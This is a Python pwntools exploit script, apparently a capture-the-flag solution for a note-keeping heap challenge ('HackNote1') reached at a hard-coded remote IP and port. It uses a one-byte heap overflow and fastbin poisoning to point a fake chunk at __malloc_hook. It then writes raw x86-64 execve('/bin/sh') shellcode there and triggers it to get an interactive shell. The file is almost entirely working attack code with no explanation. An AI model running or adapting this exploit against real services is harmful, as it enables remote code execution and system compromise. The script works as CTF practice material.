#coding=utf-8
from pwn import *
local = 0
exec_file="./HackNote1"
context.log_level="debug"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("183.129.189.62","11204")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    #text_base,libc_base=get_base(a)
    #script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script='''
    b *0x0000000000400BC5
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.recvuntil("4. Exit\n")
    a.sendlineafter("-----------------\n",str(idx))
def add(size,content):
    menu(1)
    a.sendlineafter("Input the Size:\n",str(size))
    a.sendafter("Input the Note:\n",content)

def delete(idx):
    menu(2)
    a.sendlineafter("Input the Index of Note:\n",str(idx))

def edit(idx,content):
    menu(3)
    a.sendlineafter("Input the Index of Note:\n",str(idx))
    a.sendafter("Input the Note:\n",content)
__malloc_hook = 0x0000000006CB788
size_addr  = 0x6cbcc0
fake_chunk_addr = 0x6cb772
ptr_addr = 0x00000000006CBC40
#debug()
add(0x38,'A\n')#0 0x6cf890
add(0x38,'A\n')#1
add(0x38,'A\n')#2
add(0x38,'A\n')#3
add(0x38,'A\n')#4

edit(0,'A'*0x38)   
edit(0,'A'*0x38+'\xc1') 
delete(1)
add(0x78,'A\n')#1

delete(2)
payload='A'*0x38+p64(0x41)
payload+=p64(fake_chunk_addr)+'\n'
edit(1,payload)
add(0x38,'A\n')#2
payload='A'*6+p64(__malloc_hook+8)
payload+="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
#debug()
add(0x38,payload+'\n')
menu(1)
a.sendlineafter("Input the Size:\n",str(10))    

a.interactive()









